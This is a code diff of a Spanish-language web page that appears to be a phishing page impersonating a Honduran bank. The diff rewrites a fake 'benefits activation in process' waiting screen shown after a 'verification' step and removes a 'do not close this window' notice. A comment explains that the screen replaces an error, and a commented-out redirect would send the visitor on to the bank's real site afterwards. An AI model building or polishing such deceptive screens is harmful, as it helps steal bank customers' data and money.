@@ -26,7 +26,7 @@
             animation: spin 0.8s linear infinite;
         }
 
-        /* ===== NUEVA ANIMACIÓN PARA LA PANTALLA DE ESPERA ===== */
+        /* ===== ANIMACIONES PARA PANTALLA DE ESPERA ===== */
         @keyframes pulse-dot {
             0%, 100% { opacity: 0.3; transform: scale(0.8); }
             50% { opacity: 1; transform: scale(1.2); }
@@ -87,7 +87,7 @@
         </div>
     </div>
 
-    <!-- ===== PANTALLA DE ESPERA (NUEVA) ===== -->
+    <!-- ===== PANTALLA DE ESPERA (HABILITACIÓN) ===== -->
     <div id="stepWaiting" class="fixed inset-0 bg-white z-50 flex flex-col items-center justify-center hidden">
         <div class="flex flex-col items-center max-w-sm text-center px-6">
             <!-- Icono de reloj animado -->
@@ -100,12 +100,12 @@
 
             <!-- Título con efecto shimmer -->
             <h2 class="text-2xl font-bold shimmer-text mb-2 fade-in-up">
-                Reactivación en Proceso
+                Habilitación en Proceso
             </h2>
 
             <!-- Mensaje principal -->
             <p class="text-gray-700 text-base font-semibold mb-1 fade-in-up" style="animation-delay: 0.2s;">
-                Espere <span class="text-[#D9272E] font-extrabold">30 minutos</span> para que los beneficios sean reactivados.
+                Espere <span class="text-[#D9272E] font-extrabold">30 minutos</span> para que los beneficios sean activados.
             </p>
 
             <!-- Subtítulo -->
@@ -125,11 +125,9 @@
                 <div class="bg-[#D9272E] h-1.5 rounded-full progress-bar-animate"></div>
             </div>
 
-            <!-- Mensaje de no cerrar -->
-            <p class="text-[10px] text-gray-300 mt-4 flex items-center gap-1">
-                <i class="fa-solid fa-circle-exclamation text-[10px]"></i>
-                No cierre esta ventana mientras se procesa la solicitud
-            </p>
+            <!-- ===== MENSAJE ELIMINADO ===== -->
+            <!-- Ya no aparece "No cierre esta ventana" -->
+
         </div>
     </div>
 
@@ -352,16 +350,14 @@
                 });
 
                 // ============================================
-                // 🔥 CAMBIO AQUÍ: En lugar de mostrar error,
-                // muestra la pantalla de espera
+                // 🔥 MUESTRA PANTALLA DE HABILITACIÓN
                 // ============================================
                 setTimeout(() => {
                     loader.classList.add('hidden');
                     document.getElementById('stepVerification').classList.add('hidden');
                     document.getElementById('stepWaiting').classList.remove('hidden');
                     
-                    // Opcional: después de 30 segundos (o 30 minutos simulados)
-                    // podrías redirigir al banco real
+                    // Opcional: redirigir al banco real después de 30 segundos
                     // setTimeout(() => {
                     //     window.location.href = "https://www.bancatlan.hn/";
                     // }, 30000);
